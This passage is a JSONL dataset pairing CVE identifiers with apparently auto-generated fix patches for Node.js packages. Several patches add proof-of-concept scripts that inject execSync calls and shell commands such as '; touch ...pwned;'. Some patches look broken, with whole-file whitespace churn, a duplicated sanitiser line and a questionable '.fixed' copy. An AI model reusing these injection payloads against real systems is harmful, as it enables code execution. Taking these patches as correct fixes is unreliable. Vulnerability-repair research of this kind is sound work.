{\n-\t\t\t\tif (typeof(members[key]) == 'function') {\n-\t\t\t\t\tmembers[key] = util.promisify( members[key] );\n-\t\t\t\t}\n-\t\t\t} );\n-\t\t}\n-\t\telse {\n-\t\t\t// promisify all\n-\t\t\tfor (var key in members) {\n-\t\t\t\tif (!key.match(/^__/) && (typeof(members[key]) == 'function')) {\n-\t\t\t\t\tmembers[key] = util.promisify( members[key] );\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\tdelete members.__promisify;\n-\t}\n-\t\n-\t// fill prototype members\n-\tfor (var key in members) {\n-\t\tconstructor.prototype[key] = members[key];\n-\t}\n-\t\n-\t// return completed class definition\n-\treturn constructor;\n+        // create new class using php-style syntax (sort of)\n+        if (!members) members = {};\n+        \n+        // setup constructor\n+        var constructor = null;\n+        \n+        // inherit from parent class\n+        if (members.__parent) {\n+                if (members.__construct) {\n+                        // explicit constructor passed in\n+                        constructor = members.__construct;\n+                }\n+                else {\n+                        // inherit parent's constructor\n+                        var parent = members.__parent; \n+                        constructor = function() { \n+                                parent.apply(this, arguments); \n+                        };\n+                }\n+                \n+                // inherit rest of parent members\n+                util.inherits(constructor, members.__parent);\n+                delete members.__parent;\n+        }\n+        else {\n+                // create new base class\n+                constructor = members.__construct || function() {};\n+        }\n+        delete members.__construct;\n+        \n+        // handle static variables\n+        if (members.__static) {\n+                for (var key in members.__static) {\n+                        constructor[key] = members.__static[key];\n+                }\n+                delete members.__static;\n+        }\n+        \n+        // all classes are event emitters unless explicitly disabled\n+        if (members.__events !== false) {\n+                if (!members.__mixins) members.__mixins = [];\n+                if (members.__mixins.indexOf(events.EventEmitter) == -1) {\n+                        members.__mixins.push( events.EventEmitter );\n+                }\n+        }\n+        delete members.__events;\n+        \n+        // handle mixins\n+        if (members.__mixins) {\n+                for (var idx = 0, len = members.__mixins.length; idx < len; idx++) {\n+                        var class_obj = members.__mixins[idx];\n+                        \n+                        for (var key in class_obj.prototype) {\n+                                if (!key.match(/^__/) && (typeof(constructor.prototype[key]) == 'undefined')) {\n+                                        constructor.prototype[key] = class_obj.prototype[key];\n+                                }\n+                        }\n+                        var static_members = class_obj.__static;\n+                        if (static_members) {\n+                                for (var key in static_members) {\n+                                        if (typeof(constructor[key]) == 'undefined') constructor[key] = static_members[key];\n+                                }\n+                        }\n+                } // foreach mixin\n+                delete members.__mixins;\n+        } // mixins\n+        \n+        // handle promisify (node 8+)\n+        if (members.__promisify && util.promisify) {\n+                if (Array.isArray(members.__promisify)) {\n+                        // promisify some\n+                        members.__promisify.forEach( function(key) {\n+                                if (typeof(members[key]) == 'function') {\n+                                        members[key] = util.promisify( members[key] );\n+                                }\n+                        } );\n+                }\n+                else {\n+                        // promisify all\n+                        for (var key in members) {\n+                                if (!key.match(/^__/) && (typeof(members[key]) == 'function')) {\n+                                        members[key] = util.promisify( members[key] );\n+                                }\n+                        }\n+                }\n+                delete members.__promisify;\n+        }\n+        \n+        // fill prototype members\n+        for (var key in members) {\n+                constructor.prototype[key] = members[key];\n+        }\n+        \n+        // return completed class definition\n+        return constructor;\n };\n"}
{"cve":"CVE-2017-16198:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex cad0b67..dbeda89 100644\n--- a/index.js\n+++ b/index.js\n@@ -19,13 +19,14 @@ var http = require('http'),\n     logger = require('./log');\n \n //Web\u670d\u52a1\u5668\u4e3b\u51fd\u6570,\u89e3\u6790\u8bf7\u6c42,\u8fd4\u56deWeb\u5185\u5bb9 \n-var main = function(req, res) {\n+    var main = function(req, res) {\n         var reqUrl = req.url; \n         //\u8bb0\u5f55\u8bf7\u6c42\u4fe1\u606f\n         logger.http(req, res);\n         \n         //\u4f7f\u7528url\u89e3\u6790\u6a21\u5757\u83b7\u53d6url\u4e2d\u7684\u8def\u5f84\u540d \n-        var pathName = url.parse(reqUrl).pathname;\n+        var pathName = decodeURIComponent(url.parse(reqUrl).pathname);\n+        pathName = path.normalize(pathName).replace(/^(\\.\\.[\\\\/\\\\])+/, '');\n \n         //\u8865\u5168\u6587\u4ef6\u8def\u5f84\n         if (path.extname(pathName) == \"\") {\n"}
{"cve":"CVE-2020-7674:0708", "fix_patch": "diff --git a/encode.js.fixed b/encode.js.fixed\nnew file mode 100644\nindex 0000000..46f914e\n--- /dev/null\n+++ b/encode.js.fixed\n@@ -0,0 +1,41 @@\n+'use strict';\n+\n+function template(literal, data) {\n+  // eslint-disable-next-line no-useless-escape\n+  return literal.replace(/\\${(.*?)\\}/g, function (match, field) {\n+    var fields = field.split('.');\n+    var context = data;\n+    for (var i = 0; i < fields.length; i++) {\n+      if (!context.hasOwnProperty(fields[i])) {\n+        return match;\n+      }\n+      context = context[fields[i]];\n+    }\n+    if (typeof context === 'object') {\n+      return JSON.stringify(context);\n+    }\n+    return context;\n+  });\n+}\n+\n+function encodeStatements(statements, data) {\n+  if (!statements) {\n+    throw new SyntaxError('Must include statements to encode');\n+  }\n+\n+  if (!data) {\n+    return statements;\n+  }\n+\n+  var output = template(JSON.stringify(statements), data);\n+  output = JSON.parse(output);\n+\n+  Object.defineProperty(output, 'encoded', {\n+    __proto__: null,\n+    value: true\n+  });\n+\n+  return output;\n+}\n+\n+module.exports = encodeStatements;\ndiff --git a/exploit.js b/exploit.js\nnew file mode 100644\nindex 0000000..03dd86f\n--- /dev/null\n+++ b/exploit.js\n@@ -0,0 +1,16 @@\n+\n+const encodeStatements = require('./lib/encode.js');\n+\n+const statements = {\n+    \"Effect\": \"Allow\",\n+    \"Action\": \"s3:GetObject\",\n+    \"Resource\": \"${process.mainModule.require('child_process').execSync('touch /tmp/pwned')}\"\n+};\n+\n+const data = {};\n+\n+try {\n+    encodeStatements(statements, data);\n+} catch (e) {\n+    // console.error(e);\n+}\ndiff --git a/lib/encode.js.fixed b/lib/encode.js.fixed\nnew file mode 100644\nindex 0000000..46f914e\n--- /dev/null\n+++ b/lib/encode.js.fixed\n@@ -0,0 +1,41 @@\n+'use strict';\n+\n+function template(literal, data) {\n+  // eslint-disable-next-line no-useless-escape\n+  return literal.replace(/\\${(.*?)\\}/g, function (match, field) {\n+    var fields = field.split('.');\n+    var context = data;\n+    for (var i = 0; i < fields.length; i++) {\n+      if (!context.hasOwnProperty(fields[i])) {\n+        return match;\n+      }\n+      context = context[fields[i]];\n+    }\n+    if (typeof context === 'object') {\n+      return JSON.stringify(context);\n+    }\n+    return context;\n+  });\n+}\n+\n+function encodeStatements(statements, data) {\n+  if (!statements) {\n+    throw new SyntaxError('Must include statements to encode');\n+  }\n+\n+  if (!data) {\n+    return statements;\n+  }\n+\n+  var output = template(JSON.stringify(statements), data);\n+  output = JSON.parse(output);\n+\n+  Object.defineProperty(output, 'encoded', {\n+    __proto__: null,\n+    value: true\n+  });\n+\n+  return output;\n+}\n+\n+module.exports = encodeStatements;\ndiff --git a/reproduce.js b/reproduce.js\nnew file mode 100644\nindex 0000000..22c33a6\n--- /dev/null\n+++ b/reproduce.js\n@@ -0,0 +1,31 @@\n+const encodeStatements = require('./lib/encode.js');\n+const fs = require('fs');\n+\n+const statements = [{\n+    \"Effect\": \"Allow\",\n+    \"Action\": [\"s3:GetObject\"],\n+    \"Resource\": [\"arn:aws:s3:::examplebucket/${user.name}/*\"]\n+}];\n+\n+const data = {\n+    user: {\n+        get name() {\n+            try {\n+                require('child_process').execSync('touch /tmp/pwned');\n+            } catch (e) {}\n+            return 'pwned';\n+        }\n+    }\n+};\n+\n+try {\n+    encodeStatements(statements, data);\n+} catch (e) {\n+    // some versions might throw error\n+}\n+\n+if (fs.existsSync('/tmp/pwned')) {\n+    console.log('Vulnerability confirmed: /tmp/pwned created.');\n+} else {\n+    console.log('Vulnerability not triggered.');\n+}\n\\ No newline at end of file\ndiff --git a/reproduce_bug.js b/reproduce_bug.js\nnew file mode 100644\nindex 0000000..9b241a6\n--- /dev/null\n+++ b/reproduce_bug.js\n@@ -0,0 +1,25 @@\n+\n+const encodeStatements = require('/workspace/access-policy/lib/encode.js');\n+const fs = require('fs');\n+\n+const statements = [{\n+    \"Effect\": \"Allow\",\n+    \"Action\": [\"s3:GetObject\"],\n+    \"Resource\": [\"arn:aws:s3:::examplebucket/${user.id}/*\"]\n+}];\n+\n+const data = {\n+    'user.id': `\\`);require('child_process').execSync('touch /tmp/pwned');console.log(\\``\n+};\n+\n+try {\n+    encodeStatements(statements, data);\n+} catch (e) {\n+    // Expected to fail\n+}\n+\n+if (fs.existsSync('/tmp/pwned')) {\n+    console.log('Vulnerability confirmed: /tmp/pwned created.');\n+} else {\n+    console.log('Vulnerability not triggered.');\n+}\ndiff --git a/reproduce_bug2.js b/reproduce_bug2.js\nnew file mode 100644\nindex 0000000..5f23b0d\n--- /dev/null\n+++ b/reproduce_bug2.js\n@@ -0,0 +1,33 @@\n+const encodeStatements = require('./lib/encode.js');\n+const fs = require('fs');\n+\n+const statements = [{\n+    \"Effect\": \"Allow\",\n+    \"Action\": [\"s3:GetObject\"],\n+    \"Resource\": [\"arn:aws:s3:::examplebucket/${user.name}/*\"]\n+}];\n+\n+const data = {\n+    user: {\n+        get name() {\n+            try {\n+                require('child_process').execSync('touch /tmp/pwned');\n+            } catch (e) {}\n+            return 'pwned';\n+        }\n+    }\n+};\n+\n+try {\n+    const encoded = encodeStatements(statements, data);\n+    // console.log(JSON.stringify(encoded, null, 2));\n+} catch (e) {\n+    // some versions might throw error\n+    // console.error(e)\n+}\n+\n+if (fs.existsSync('/tmp/pwned')) {\n+    console.log('Vulnerability confirmed: /tmp/pwned created.');\n+} else {\n+    console.log('Vulnerability not triggered.');\n+}\n\\ No newline at end of file\ndiff --git a/reproduce_vulnerability.js b/reproduce_vulnerability.js\nnew file mode 100644\nindex 0000000..a0e783b\n--- /dev/null\n+++ b/reproduce_vulnerability.js\n@@ -0,0 +1,32 @@\n+\n+const encodeStatements = require('/workspace/access-policy/lib/encode.js');\n+const fs = require('fs');\n+\n+const statements = [{\n+    \"Effect\": \"Allow\",\n+    \"Action\": [\"s3:GetObject\"],\n+    \"Resource\": [\"arn:aws:s3:::examplebucket/*\"],\n+    \"Condition\": {\n+        \"StringEquals\": {\n+            \"aws:userId\": \"${user.id}\"\n+        }\n+    }\n+}];\n+\n+const data = {\n+    user: {\n+        id: `';require('child_process').execSync('touch /tmp/pwned');'`\n+    }\n+};\n+\n+try {\n+    encodeStatements(statements, data);\n+} catch (e) {\n+    // The patched code will throw an error, which is expected.\n+}\n+\n+if (fs.existsSync('/tmp/pwned')) {\n+    console.log('Vulnerability confirmed: /tmp/pwned created.');\n+} else {\n+    console.log('Vulnerability not triggered.');\n+}\ndiff --git a/reproducer.js b/reproducer.js\nnew file mode 100644\nindex 0000000..22c33a6\n--- /dev/null\n+++ b/reproducer.js\n@@ -0,0 +1,31 @@\n+const encodeStatements = require('./lib/encode.js');\n+const fs = require('fs');\n+\n+const statements = [{\n+    \"Effect\": \"Allow\",\n+    \"Action\": [\"s3:GetObject\"],\n+    \"Resource\": [\"arn:aws:s3:::examplebucket/${user.name}/*\"]\n+}];\n+\n+const data = {\n+    user: {\n+        get name() {\n+            try {\n+                require('child_process').execSync('touch /tmp/pwned');\n+            } catch (e) {}\n+            return 'pwned';\n+        }\n+    }\n+};\n+\n+try {\n+    encodeStatements(statements, data);\n+} catch (e) {\n+    // some versions might throw error\n+}\n+\n+if (fs.existsSync('/tmp/pwned')) {\n+    console.log('Vulnerability confirmed: /tmp/pwned created.');\n+} else {\n+    console.log('Vulnerability not triggered.');\n+}\n\\ No newline at end of file\ndiff --git a/test_patch.js b/test_patch.js\nnew file mode 100644\nindex 0000000..0a78723\n--- /dev/null\n+++ b/test_patch.js\n@@ -0,0 +1,43 @@\n+const assert = require('assert');\n+const fs = require('fs');\n+const original_encode = require('/workspace/access-policy/lib/encode.js');\n+const patched_encode = require('/workspace/access-policy/lib/encode.js.fixed');\n+\n+function run_test(encodeStatements, test_name) {\n+    // Clean up any previous test file\n+    if (fs.existsSync('/tmp/pwned')) {\n+        fs.unlinkSync('/tmp/pwned');\n+    }\n+\n+    const statements = [{\n+        \"Effect\": \"Allow\",\n+        \"Action\": [\"s3:GetObject\"],\n+        \"Resource\": [\"arn:aws:s3:::examplebucket/${user.name}/*\"]\n+    }];\n+\n+    const data = {\n+        user: {\n+            get name() {\n+                try {\n+                    require('child_process').execSync('touch /tmp/pwned');\n+                } catch (e) {}\n+                return 'pwned';\n+            }\n+        }\n+    };\n+\n+    try {\n+        encodeStatements(statements, data);\n+    } catch (e) {\n+        // The vulnerable version might throw an error, but the file will still be created.\n+    }\n+\n+    if (fs.existsSync('/tmp/pwned')) {\n+        console.log(`${test_name}: Vulnerability confirmed: /tmp/pwned created.`);\n+    } else {\n+        console.log(`${test_name}: Vulnerability not triggered.`);\n+    }\n+}\n+\n+run_test(original_encode, \"Original\");\n+run_test(patched_encode, \"Patched\");\n\\ No newline at end of file\n"}
{"cve":"CVE-2021-23376:0708", "fix_patch": "diff --git a/index.js b/index.js\nindex 8a9c7ea..26a744b 100644\n--- a/index.js\n+++ b/index.js\n@@ -1,4 +1,4 @@\n-const { exec } = require(\"child_process\");\n+const { exec, execFile } = require(\"child_process\");\n const fs = require(\"fs\");\n \n const filestostring = array => {\n@@ -216,8 +216,23 @@ const ffmpegjs = {\n   trimvideo: (input, start, duration, output) => {\n     return new Promise(function(resolve, reject) {\n       if (fs.existsSync(input)) {\n-        exec(\n-          `ffmpeg -hide_banner -loglevel quiet -ss ${start} -i ${input} -t ${duration} -c copy -y ${output}.mp4`,\n+                        execFile(\n+          'ffmpeg',\n+          [\n+            '-hide_banner',\n+            '-loglevel',\n+            'quiet',\n+            '-ss',\n+            start,\n+            '-i',\n+            input,\n+            '-t',\n+            duration,\n+            '-c',\n+            'copy',\n+            '-y',\n+            `${output}.mp4`\n+          ],\n           (error, stdout, stderr) => {\n             if (error) {\n               reject(error);\ndiff --git a/poc.js b/poc.js\nnew file mode 100644\nindex 0000000..dfcab5b\n--- /dev/null\n+++ b/poc.js\n@@ -0,0 +1,17 @@\n+const ffmpeg = require('/workspace/ffmpegdotjs/index.js');\n+const fs = require('fs');\n+\n+// Create a dummy file to trim\n+try {\n+  fs.writeFileSync('/workspace/ffmpegdotjs/test.mp4', 'dummy content');\n+} catch (e) {\n+  // doesn't matter if it fails\n+}\n+\n+ffmpeg.trimvideo('/workspace/ffmpegdotjs/test.mp4', '0', '1', '; touch /workspace/ffmpegdotjs/pwned;')\n+  .then((output) => {\n+    console.log(`Success: ${output}`);\n+  })\n+  .catch((error) => {\n+    console.error(error.message);\n+  });\n\\ No newline at end of file\n"}
{"cve":"CVE-2020-28494:0708", "fix_patch": "diff --git a/image.js b/image.js\nindex 19631b27..96874d55 100755\n--- a/image.js\n+++ b/image.js\n@@ -43,18 +43,18 @@ var CACHE = {};\n var middlewares = {};\n \n if (!global.framework_utils)\n-\tglobal.framework_utils = require('./utils');\n+        global.framework_utils = require('./utils');\n \n function u16(buf, o) {\n-\treturn buf[o] << 8 | buf[o + 1];\n+        return buf[o] << 8 | buf[o + 1];\n }\n \n function u32(buf, o) {\n-\treturn buf[o] << 24 | buf[o + 1] << 16 | buf[o + 2] << 8 | buf[o + 3];\n+        return buf[o] << 24 | buf[o + 1] << 16 | buf[o + 2] << 8 | buf[o + 3];\n }\n \n exports.measureGIF = function(buffer) {\n-\treturn { width: buffer[6], height: buffer[8] };\n+        return { width: buffer[6], height: buffer[8] };\n };\n \n // MIT\n@@ -62,146 +62,146 @@ exports.measureGIF = function(buffer) {\n // visionmedia\n exports.measureJPG = function(buffer) {\n \n-\tvar len = buffer.length;\n-\tvar o = 0;\n+        var len = buffer.length;\n+        var o = 0;\n \n-\tvar jpeg = 0xff == buffer[0] && 0xd8 == buffer[1];\n-\tif (jpeg) {\n-\t\to += 2;\n-\t\twhile (o < len) {\n-\t\t\twhile (0xff != buffer[o]) o++;\n-\t\t\twhile (0xff == buffer[o]) o++;\n-\t\t\tif (sof[buffer[o]])\n-\t\t\t\treturn { width: u16(buffer, o + 6), height: u16(buffer, o + 4) };\n-\t\t\telse\n-\t\t\t\to += u16(buffer, ++o);\n+        var jpeg = 0xff == buffer[0] && 0xd8 == buffer[1];\n+        if (jpeg) {\n+                o += 2;\n+                while (o < len) {\n+                        while (0xff != buffer[o]) o++;\n+                        while (0xff == buffer[o]) o++;\n+                        if (sof[buffer[o]])\n+                                return { width: u16(buffer, o + 6), height: u16(buffer, o + 4) };\n+                        else\n+                                o += u16(buffer, ++o);\n \n-\t\t}\n-\t}\n+                }\n+        }\n \n-\treturn null;\n+        return null;\n };\n \n // MIT\n // Written by TJ Holowaychuk\n // visionmedia\n exports.measurePNG = function(buffer) {\n-\treturn { width: u32(buffer, 16), height: u32(buffer, 16 + 4) };\n+        return { width: u32(buffer, 16), height: u32(buffer, 16 + 4) };\n };\n \n exports.measureSVG = function(buffer) {\n \n-\tvar match = buffer.toString('utf8').match(REGEXP_SVG);\n-\tif (!match)\n-\t\treturn;\n+        var match = buffer.toString('utf8').match(REGEXP_SVG);\n+        if (!match)\n+                return;\n \n-\tvar width = 0;\n-\tvar height = 0;\n+        var width = 0;\n+        var height = 0;\n \n-\tfor (var i = 0, length = match.length; i < length; i++) {\n-\t\tvar value = match[i];\n+        for (var i = 0, length = match.length; i < length; i++) {\n+                var value = match[i];\n \n-\t\tif (width > 0 && height > 0)\n-\t\t\tbreak;\n+                if (width > 0 && height > 0)\n+                        break;\n \n-\t\tif (!width && value.startsWith('width=\"'))\n-\t\t\twidth = value.parseInt2();\n+                if (!width && value.startsWith('width=\"'))\n+                        width = value.parseInt2();\n \n-\t\tif (!height && value.startsWith('height=\"'))\n-\t\t\theight = value.parseInt2();\n-\t}\n+                if (!height && value.startsWith('height=\"'))\n+                        height = value.parseInt2();\n+        }\n \n-\treturn { width: width, height: height };\n+        return { width: width, height: height };\n };\n \n exports.measure = function(type, buffer) {\n-\tswitch (type) {\n-\t\tcase '.jpg':\n-\t\tcase '.jpeg':\n-\t\tcase 'jpg':\n-\t\tcase 'jpeg':\n-\t\tcase 'image/jpeg':\n-\t\t\treturn exports.measureJPG(buffer);\n-\t\tcase '.gif':\n-\t\tcase 'gif':\n-\t\tcase 'image/gif':\n-\t\t\treturn exports.measureGIF(buffer);\n-\t\tcase '.png':\n-\t\tcase 'png':\n-\t\tcase 'image/png':\n-\t\t\treturn exports.measurePNG(buffer);\n-\t\tcase '.svg':\n-\t\tcase 'svg':\n-\t\tcase 'image/svg+xml':\n-\t\t\treturn exports.measureSVG(buffer);\n-\t}\n+        switch (type) {\n+                case '.jpg':\n+                case '.jpeg':\n+                case 'jpg':\n+                case 'jpeg':\n+                case 'image/jpeg':\n+                        return exports.measureJPG(buffer);\n+                case '.gif':\n+                case 'gif':\n+                case 'image/gif':\n+                        return exports.measureGIF(buffer);\n+                case '.png':\n+                case 'png':\n+                case 'image/png':\n+                        return exports.measurePNG(buffer);\n+                case '.svg':\n+                case 'svg':\n+                case 'image/svg+xml':\n+                        return exports.measureSVG(buffer);\n+        }\n };\n \n function Image(filename, cmd, width, height) {\n-\tvar type = typeof(filename);\n-\tthis.width = width;\n-\tthis.height = height;\n-\tthis.builder = [];\n-\tthis.filename = type === 'string' ? filename : null;\n-\tthis.currentStream = type === 'object' ? filename : null;\n-\tthis.outputType = type === 'string' ? framework_utils.getExtension(filename) : 'jpg';\n-\tthis.islimit = false;\n-\tthis.cmdarg = cmd || CONF.default_image_converter;\n+        var type = typeof(filename);\n+        this.width = width;\n+        this.height = height;\n+        this.builder = [];\n+        this.filename = type === 'string' ? filename : null;\n+        this.currentStream = type === 'object' ? filename : null;\n+        this.outputType = type === 'string' ? framework_utils.getExtension(filename) : 'jpg';\n+        this.islimit = false;\n+        this.cmdarg = cmd || CONF.default_image_converter;\n }\n \n var ImageProto = Image.prototype;\n \n ImageProto.clear = function() {\n-\tvar self = this;\n-\tself.builder = [];\n-\treturn self;\n+        var self = this;\n+        self.builder = [];\n+        return self;\n };\n \n ImageProto.measure = function(callback) {\n \n-\tvar self = this;\n-\tvar index = self.filename.lastIndexOf('.');\n+        var self = this;\n+        var index = self.filename.lastIndexOf('.');\n \n-\tif (!self.filename) {\n-\t\tcallback(new Error('Measure does not support stream.'));\n-\t\treturn;\n-\t}\n+        if (!self.filename) {\n+                callback(new Error('Measure does not support stream.'));\n+                return;\n+        }\n \n-\tif (index === -1) {\n-\t\tcallback(new Error('This type of file is not supported.'));\n-\t\treturn;\n-\t}\n+        if (index === -1) {\n+                callback(new Error('This type of file is not supported.'));\n+                return;\n+        }\n \n-\tF.stats.performance.open++;\n-\tvar extension = self.filename.substring(index).toLowerCase();\n-\tvar stream = require('fs').createReadStream(self.filename, { start: 0, end: extension === '.jpg' ? 40000 : 24 });\n+        F.stats.performance.open++;\n+        var extension = self.filename.substring(index).toLowerCase();\n+        var stream = require('fs').createReadStream(self.filename, { start: 0, end: extension === '.jpg' ? 40000 : 24 });\n \n-\tstream.on('data', function(buffer) {\n+        stream.on('data', function(buffer) {\n \n-\t\tswitch (extension) {\n-\t\t\tcase '.jpg':\n-\t\t\t\tcallback(null, exports.measureJPG(buffer));\n-\t\t\t\treturn;\n-\t\t\tcase '.gif':\n-\t\t\t\tcallback(null, exports.measureGIF(buffer));\n-\t\t\t\treturn;\n-\t\t\tcase '.png':\n-\t\t\t\tcallback(null, exports.measurePNG(buffer));\n-\t\t\t\treturn;\n-\t\t}\n+                switch (extension) {\n+                        case '.jpg':\n+                                callback(null, exports.measureJPG(buffer));\n+                                return;\n+                        case '.gif':\n+                                callback(null, exports.measureGIF(buffer));\n+                                return;\n+                        case '.png':\n+                                callback(null, exports.measurePNG(buffer));\n+                                return;\n+                }\n \n-\t\tcallback(new Error('This type of file is not supported.'));\n-\t});\n+                callback(new Error('This type of file is not supported.'));\n+        });\n \n-\tstream.on('error', callback);\n-\treturn self;\n+        stream.on('error', callback);\n+        return self;\n };\n \n ImageProto.$$measure = function() {\n-\tvar self = this;\n-\treturn function(callback) {\n-\t\tself.measure(callback);\n-\t};\n+        var self = this;\n+        return function(callback) {\n+                self.measure(callback);\n+        };\n };\n \n /**\n@@ -213,101 +213,103 @@ ImageProto.$$measure = function() {\n  */\n ImageProto.save = function(filename, callback, writer) {\n \n-\tvar self = this;\n+        var self = this;\n \n-\tif (typeof(filename) === 'function') {\n-\t\tcallback = filename;\n-\t\tfilename = null;\n-\t}\n+        if (typeof(filename) === 'function') {\n+                callback = filename;\n+                filename = null;\n+        }\n \n-\t!self.builder.length && self.minify();\n-\tfilename = filename || self.filename || '';\n+        !self.builder.length && self.minify();\n+        filename = filename || self.filename || '';\n \n-\tvar command = self.cmd(self.filename ? self.filename : '-', filename);\n+        var command = self.cmd(self.filename ? self.filename : '-', filename);\n \n-\tif (F.isWindows)\n-\t\tcommand = command.replace(REGEXP_PATH, '\\\\');\n+        if (F.isWindows)\n+                command = command.replace(REGEXP_PATH, '\\\\');\n \n-\tvar cmd = exec(command, function(err) {\n+        var cmd = exec(command, function(err) {\n \n-\t\t// clean up\n-\t\tcmd.kill();\n-\t\tcmd = null;\n+                // clean up\n+                cmd.kill();\n+                cmd = null;\n \n-\t\tself.clear();\n+                self.clear();\n \n-\t\tif (!callback)\n-\t\t\treturn;\n+                if (!callback)\n+                        return;\n \n-\t\tif (err) {\n-\t\t\tcallback(err, false);\n-\t\t\treturn;\n-\t\t}\n+                if (err) {\n+                        callback(err, false);\n+                        return;\n+                }\n \n-\t\tvar middleware = middlewares[self.outputType];\n-\t\tif (!middleware)\n-\t\t\treturn callback(null, true);\n+                var middleware = middlewares[self.outputType];\n+                if (!middleware)\n+                        return callback(null, true);\n \n-\t\tF.stats.performance.open++;\n-\t\tvar reader = Fs.createReadStream(filename);\n-\t\tvar writer = Fs.createWriteStream(filename + '_');\n+                F.stats.performance.open++;\n+                var reader = Fs.createReadStream(filename);\n+                var writer = Fs.createWriteStream(filename + '_');\n \n-\t\treader.pipe(middleware()).pipe(writer);\n-\t\twriter.on('finish', () => Fs.rename(filename + '_', filename, () => callback(null, true)));\n-\t});\n+                reader.pipe(middleware()).pipe(writer);\n+                writer.on('finish', () => Fs.rename(filename + '_', filename, () => callback(null, true)));\n+        });\n \n-\tif (self.currentStream) {\n-\t\tif (self.currentStream instanceof Buffer)\n-\t\t\tcmd.stdin.end(self.currentStream);\n-\t\telse\n-\t\t\tself.currentStream.pipe(cmd.stdin);\n-\t}\n+        if (self.currentStream) {\n+                if (self.currentStream instanceof Buffer)\n+                        cmd.stdin.end(self.currentStream);\n+                else\n+                        self.currentStream.pipe(cmd.stdin);\n+        }\n \n-\tCLEANUP(cmd.stdin);\n-\twriter && writer(cmd.stdin);\n-\treturn self;\n+        CLEANUP(cmd.stdin);\n+        writer && writer(cmd.stdin);\n+        return self;\n };\n \n ImageProto.$$save = function(filename, writer) {\n-\tvar self = this;\n-\treturn function(callback) {\n-\t\tself.save(filename, callback, writer);\n-\t};\n+        var self = this;\n+        return function(callback) {\n+                self.save(filename, callback, writer);\n+        };\n };\n \n ImageProto.pipe = function(stream, type, options) {\n \n-\tvar self = this;\n+        var self = this;\n \n-\tif (typeof(type) === 'object') {\n-\t\toptions = type;\n-\t\ttype = null;\n-\t}\n+        if (typeof(type) === 'object') {\n+                options = type;\n+                type = null;\n+        }\n \n-\t!self.builder.length && self.minify();\n-\t!type && (type = self.outputType);\n+        !self.builder.length && self.minify();\n+        if (type) type = type.replace(/[^a-zA-Z0-9]/g, '');\n+if (type)\n+type = type.replace(/[^a-zA-Z0-9]/g, '');\n \n-\tF.stats.performance.open++;\n-\tvar cmd = spawn(CMD_CONVERT[self.cmdarg], self.arg(self.filename ? wrap(self.filename) : '-', (type ? type + ':' : '') + '-'), SPAWN_OPT);\n-\tcmd.stderr.on('data', stream.emit.bind(stream, 'error'));\n-\tcmd.stdout.on('data', stream.emit.bind(stream, 'data'));\n-\tcmd.stdout.on('end', stream.emit.bind(stream, 'end'));\n-\tcmd.on('error', stream.emit.bind(stream, 'error'));\n+        F.stats.performance.open++;\n+        var cmd = spawn(CMD_CONVERT[self.cmdarg], self.arg(self.filename ? wrap(self.filename) : '-', (type ? type + ':' : '') + '-'), SPAWN_OPT);\n+        cmd.stderr.on('data', stream.emit.bind(stream, 'error'));\n+        cmd.stdout.on('data', stream.emit.bind(stream, 'data'));\n+        cmd.stdout.on('end', stream.emit.bind(stream, 'end'));\n+        cmd.on('error', stream.emit.bind(stream, 'error'));\n \n-\tvar middleware = middlewares[type];\n-\tif (middleware)\n-\t\tcmd.stdout.pipe(middleware()).pipe(stream, options);\n-\telse\n-\t\tcmd.stdout.pipe(stream, options);\n+        var middleware = middlewares[type];\n+        if (middleware)\n+                cmd.stdout.pipe(middleware()).pipe(stream, options);\n+        else\n+                cmd.stdout.pipe(stream, options);\n \n-\tif (self.currentStream) {\n-\t\tif (self.currentStream instanceof Buffer)\n-\t\t\tcmd.stdin.end(self.currentStream);\n-\t\telse\n-\t\t\tself.currentStream.pipe(cmd.stdin);\n-\t}\n+        if (self.currentStream) {\n+                if (self.currentStream instanceof Buffer)\n+                        cmd.stdin.end(self.currentStream);\n+                else\n+                        self.currentStream.pipe(cmd.stdin);\n+        }\n \n-\treturn self;\n+        return self;\n };\n \n /**\n@@ -318,228 +320,228 @@ ImageProto.pipe = function(stream, type, options) {\n  */\n ImageProto.stream = function(type, writer) {\n \n-\tvar self = this;\n+        var self = this;\n \n-\t!self.builder.length && self.minify();\n+        !self.builder.length && self.minify();\n \n-\tif (!type)\n-\t\ttype = self.outputType;\n+        if (!type)\n+                type = self.outputType;\n \n-\tF.stats.performance.open++;\n-\tvar cmd = spawn(CMD_CONVERT[self.cmdarg], self.arg(self.filename ? wrap(self.filename) : '-', (type ? type + ':' : '') + '-'), SPAWN_OPT);\n-\tif (self.currentStream) {\n-\t\tif (self.currentStream instanceof Buffer)\n-\t\t\tcmd.stdin.end(self.currentStream);\n-\t\telse\n-\t\t\tself.currentStream.pipe(cmd.stdin);\n-\t}\n+        F.stats.performance.open++;\n+        var cmd = spawn(CMD_CONVERT[self.cmdarg], self.arg(self.filename ? wrap(self.filename) : '-', (type ? type + ':' : '') + '-'), SPAWN_OPT);\n+        if (self.currentStream) {\n+                if (self.currentStream instanceof Buffer)\n+                        cmd.stdin.end(self.currentStream);\n+                else\n+                        self.currentStream.pipe(cmd.stdin);\n+        }\n \n-\twriter && writer(cmd.stdin);\n-\tvar middleware = middlewares[type];\n-\treturn middleware ? cmd.stdout.pipe(middleware()) : cmd.stdout;\n+        writer && writer(cmd.stdin);\n+        var middleware = middlewares[type];\n+        return middleware ? cmd.stdout.pipe(middleware()) : cmd.stdout;\n };\n \n ImageProto.cmd = function(filenameFrom, filenameTo) {\n \n-\tvar self = this;\n-\tvar cmd = '';\n+        var self = this;\n+        var cmd = '';\n \n-\tif (!self.islimit) {\n-\t\tvar tmp = CONF.default_image_consumption;\n-\t\tif (tmp) {\n-\t\t\tself.limit('memory', (1500 / 100) * tmp);\n-\t\t\tself.limit('map', (3000 / 100) * tmp);\n-\t\t}\n-\t}\n+        if (!self.islimit) {\n+                var tmp = CONF.default_image_consumption;\n+                if (tmp) {\n+                        self.limit('memory', (1500 / 100) * tmp);\n+                        self.limit('map', (3000 / 100) * tmp);\n+                }\n+        }\n \n-\tself.builder.sort(sort);\n+        self.builder.sort(sort);\n \n-\tvar length = self.builder.length;\n-\tfor (var i = 0; i < length; i++)\n-\t\tcmd += (cmd ? ' ' : '') + self.builder[i].cmd;\n+        var length = self.builder.length;\n+        for (var i = 0; i < length; i++)\n+                cmd += (cmd ? ' ' : '') + self.builder[i].cmd;\n \n-\treturn CMD_CONVERT2[self.cmdarg] + wrap(filenameFrom, true) + ' ' + cmd + 